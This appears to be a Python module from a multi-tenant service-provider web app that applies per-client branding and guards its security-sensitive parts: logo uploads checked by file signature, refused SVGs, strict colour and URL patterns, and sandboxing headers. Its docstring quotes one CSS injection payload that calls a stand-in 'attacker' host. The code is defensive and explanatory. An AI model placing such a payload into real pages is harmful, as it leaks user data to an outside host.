"""White-label branding: global defaults, per-client overrides, and the guards
on the two places branding is a security surface rather than a cosmetic one.

WHERE PER-CLIENT BRANDING APPLIES -- AND WHERE IT DELIBERATELY DOES NOT
----------------------------------------------------------------------
It applies to the **customer-facing surface only**: every page rendered for a
``client_readonly`` user (their whole session is one tenant), plus the
``/portal?client_id=N`` preview an admin/tech opens for a specific client.

Staff pages keep the global branding. An operator's chrome must not change
identity as they move between tenants -- a nav bar that turns into the
customer's logo on /clients/7 reads as "you are inside their system", which is
both untrue and the sort of thing that gets acted on.

**Alert emails, tickets and scheduled reports keep the GLOBAL branding**, which
is a decision and not an omission:

* Channels are configured fleet-wide (or per alert rule) and are routinely
  shared across tenants, so the same SMTP identity carries messages about many
  customers.
* The weekly fleet report and the quiet-hours digest span multiple clients, so
  "the client this message is about" is not defined for every message that goes
  out -- and a digest that had to pick one brand would pick a wrong one.
* The usual recipient is the MSP's own helpdesk. Branding that mail as the
  customer misidentifies the *sender* to the reader, and an alert email branded
  as the wrong customer is worse than an unbranded one.

If per-client alert recipients ever land (today ``email.default_recipients`` /
``reports.recipients`` are global), revisit this for the messages that provably
go to exactly one tenant -- not before.

THE TWO SINKS
-------------
``primary_color`` is interpolated into a ``style`` attribute in base.html.
Jinja's autoescaping stops an attribute breakout, but it does not stop CSS:
``red; background-image: url(https://attacker/?c=)`` stays inside the
declaration and still calls out. So the colour is **validated against a
pattern, never escaped into one** -- strictly ``#rgb``/``#rrggbb`` on the way
in, and re-checked on the way out (``safe_css_color``) so a hand-edited row or
a legacy value cannot reach the page either.

The logo is an uploaded file served from our own origin. The declared content
type is attacker-controlled, so the **bytes decide**: ``sniff_image_type``
recognises exactly four raster formats and the sniffed type -- not the declared
one -- is what gets stored and served. SVG is refused outright: it is a
document, it can carry ``<script>``, and served from this origin that script
would run with the session cookie in scope. Anything that does serve from
app_assets (including an SVG uploaded before this rule existed) goes out with
``nosniff`` and a sandboxing CSP, so it cannot execute even if it is there.
"""

from __future__ import annotations

import re
from typing import Any, Dict, Optional, Tuple

from sqlalchemy.orm import Session

from central import models as m

# --------------------------------------------------------------------------- #
# Logo upload validation
# --------------------------------------------------------------------------- #
#: Enough for a logo; blocks accidental DB bloat. Shared by the global uploader
#: and the per-client one, because there is exactly one uploader.
LOGO_MAX_BYTES = 512 * 1024

#: Declared content types we will even look at. SVG is deliberately absent --
#: see the module docstring. Ordered for the error message.
ALLOWED_LOGO_TYPES = ("image/png", "image/jpeg", "image/gif", "image/webp")

_SVG_REFUSAL = (
    "SVG logos are not accepted: an SVG is a document that can carry script, "
    "and served from this origin that script would run with your session. "
    "Export it as a PNG."
)

#: Headers every branding image goes out with. `nosniff` stops a browser
#: content-sniffing an HTML polyglot into a document; the CSP (in particular
#: `sandbox`) neuters any SVG that predates the refusal above, since CSP is
#: enforced when the resource is loaded AS a document -- which is the only way
#: its script would ever run. Neither affects an <img> render.
IMAGE_SECURITY_HEADERS = {
    "X-Content-Type-Options": "nosniff",
    "Content-Security-Policy": "default-src 'none'; style-src 'unsafe-inline'; sandbox",
}


def sniff_image_type(data: bytes) -> Optional[str]:
    """The content type the BYTES say this is, or None for anything else.

    Deliberately a short whitelist of raster formats with unambiguous magic
    numbers. A file that is not one of these -- an SVG, an HTML polyglot, a
    renamed executable -- returns None and is refused; there is no "probably
    fine" branch.
    """
    if data.startswith(b"\x89PNG\r\n\x1a\n"):
        return "image/png"
    if data.startswith(b"\xff\xd8\xff"):
        return "image/jpeg"
    if data.startswith(b"GIF87a") or data.startswith(b"GIF89a"):
        return "image/gif"
    if data[:4] == b"RIFF" and data[8:12] == b"WEBP":
        return "image/webp"
    return None


def validate_logo(declared_type: str, data: bytes) -> Tuple[Optional[str], Optional[str]]:
    """Validate an uploaded logo. Returns ``(content_type, error)``.

    ``content_type`` is the **sniffed** type, never the declared one: the
    declared type comes from the client and a browser will happily send
    ``image/png`` for anything. The filename is never consulted at all -- these
    bytes go into a BLOB column keyed by a name we compute, so there is no
    filesystem path for a crafted name to escape.
    """
    declared = (declared_type or "").split(";")[0].strip().lower()
    if declared not in ALLOWED_LOGO_TYPES:
        if declared == "image/svg+xml":
            return None, _SVG_REFUSAL
        return None, (
            "Unsupported file type: {}. Use PNG, JPEG, GIF or WEBP.".format(
                declared or "unknown"
            )
        )
    if not data:
        return None, "Empty file uploaded."
    if len(data) > LOGO_MAX_BYTES:
        return None, "File too large: {} KB (limit {} KB).".format(
            len(data) // 1024, LOGO_MAX_BYTES // 1024
        )
    sniffed = sniff_image_type(data)
    if sniffed is None:
        head = data[:512].lstrip()[:5].lower()
        if head.startswith(b"<svg") or head.startswith(b"<?xml"):
            return None, _SVG_REFUSAL
        return None, (
            "That file's contents are not a PNG, JPEG, GIF or WEBP image, "
            "whatever it was named."
        )
    return sniffed, None


# --------------------------------------------------------------------------- #
# Colour
# --------------------------------------------------------------------------- #
#: What an operator may TYPE. Strict on purpose: this value is interpolated
#: into a style attribute, so the set of accepted strings is the whole defence.
_HEX_COLOR_RE = re.compile(r"^#(?:[0-9a-f]{3}|[0-9a-f]{6})$")

#: What may be RENDERED. A superset of the above only because the global
#: `app.primary_color` setting has documented `rgb(15,23,42)` since it shipped,
#: and silently blanking a working install's nav colour is not an acceptable
#: way to introduce a guard. Bare keywords (`navy`) are letters-only, so they
#: cannot carry a `;`, a `(`, a `:` or whitespace and cannot escape the
#: declaration -- an unknown keyword is simply dropped by the browser.
_RGB_FUNC_RE = re.compile(
    r"^rgba?\(\s*\d{1,3}\s*,\s*\d{1,3}\s*,\s*\d{1,3}\s*"
    r"(?:,\s*(?:0|1|0?\.\d{1,4})\s*)?\)$"
)
_KEYWORD_COLOR_RE = re.compile(r"^[a-z]{3,20}$")

DEFAULT_PRIMARY_COLOR = "#0f172a"


def normalise_hex_color(value: Optional[str]) -> Optional[str]:
    """``#RRGGBB`` (or ``#RGB``) lowercased, or None if it is anything else.

    The input side of the colour sink: an operator either typed a hex colour or
    they did not, and "did not" is refused with a message rather than coerced.
    """
    candidate = (value or "").strip().lower()
    return candidate if _HEX_COLOR_RE.match(candidate) else None


def safe_css_color(value: Optional[str], fallback: str = DEFAULT_PRIMARY_COLOR) -> str:
    """The render-side guard: a value that is not obviously a colour never
    reaches the page, whatever put it in the database."""
    candidate = (value or "").strip().lower()
    if not candidate:
        return fallback
    if (
        _HEX_COLOR_RE.match(candidate)
        or _RGB_FUNC_RE.match(candidate)
        or _KEYWORD_COLOR_RE.match(candidate)
    ):
        return candidate
    return fallback


# --------------------------------------------------------------------------- #
# Logo URL / asset naming
# --------------------------------------------------------------------------- #
#: An absolute http(s) URL or a site-relative path, and nothing else. Excludes
#: `javascript:` and `data:` -- inert in an <img src> today, but this value is
#: operator free-text that lands in HTML, and "inert in the one place it is
#: used right now" is not a property worth depending on.
_SAFE_URL_RE = re.compile(r"^(?:https?://[^\s\"'<>\\]+|/[^\s\"'<>\\]*)$")

LOGO_URL_MAX_LEN = 1000


def safe_logo_url(value: Optional[str]) -> Optional[str]:
    """A logo URL that is safe to put in an ``<img src>``, or None."""
    candidate = (value or "").strip()
    if not candidate or len(candidate) > LOGO_URL_MAX_LEN:
        return None
    return candidate if _SAFE_URL_RE.match(candidate) else None


def client_logo_asset_name(client_id: int) -> str:
    """Key for this client's logo in ``app_assets`` (the one blob store).

    Namespaced so it cannot collide with the global ``logo`` row, and derived
    from the id rather than any operator string -- ``name`` is a 40-char
    primary key, and a client-supplied name would both overflow it and let two
    clients fight over one row.
    """
    return "client:{}:logo".format(int(client_id))


def client_logo_path(client_id: int) -> str:
    """The route that serves the above. Tenant-scoped -- see settings_routes."""
    return "/branding/clients/{}/logo".format(int(client_id))


# --------------------------------------------------------------------------- #
# Resolution
# --------------------------------------------------------------------------- #
def brand_client_for(
    db: Session, user: Optional[m.User] = None, client: Optional[m.Client] = None
) -> Optional[m.Client]:
    """Which client's branding a render should carry, if any.

    An explicit ``client`` (the portal, including an admin's preview of one)
    wins. Otherwise a ``client_readonly`` user carries their own client's
    branding on every page they can reach, so their experience is consistent
    rather than branded on one screen and generic on the next.
    """
    if client is not None:
        return client
    if (
        user is not None
        and user.role == m.UserRole.client_readonly
        and user.client_id is not None
    ):
        return db.get(m.Client, user.client_id)
    return None


def apply_client_overrides(
    base: Dict[str, Any], client: Optional[m.Client]
) -> Dict[str, Any]:
    """Layer a client's branding over the global values, field by field.

    Fallback is **total and per-field**: an unset (or unusable) override leaves
    the global value exactly as it was, so a client with nothing configured
    renders identically to today. Every override goes back through the same
    validation used on input, because the database is not a trust boundary.
    """
    if client is None:
        return base
    out = dict(base)
    name = (getattr(client, "brand_name", None) or "").strip()
    if name:
        out["name"] = name
    color = normalise_hex_color(getattr(client, "brand_primary_color", None))
    if color:
        out["primary_color"] = color
    logo = safe_logo_url(getattr(client, "brand_logo_url", None))
    if logo:
        out["logo_url"] = logo
    # Lets a template say "this page is wearing client branding" without
    # re-deriving it (nothing needs it yet; it keeps the fact addressable).
    out["brand_client_id"] = client.id
    return out


def branding_for(
    db: Session, user: Optional[m.User] = None, client: Optional[m.Client] = None
) -> Dict[str, Any]:
    """The ``app.*`` dict a template should render with."""
    from central.runtime import app_branding

    base = app_branding(db)
    return apply_client_overrides(base, brand_client_for(db, user, client))
